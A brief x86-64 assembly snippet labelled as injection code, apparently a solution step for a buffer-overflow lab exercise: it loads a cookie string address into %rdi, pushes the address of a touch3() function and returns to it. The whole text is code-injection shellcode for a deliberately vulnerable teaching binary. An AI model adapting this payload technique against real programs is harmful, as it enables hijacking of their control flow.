# injection code
mov   $0x5561dca8,%rdi   # set cookie string as touch3() argument
pushq $0x4018fa          # push address of touch3() into stack
ret                      # return to touch3() address from stack
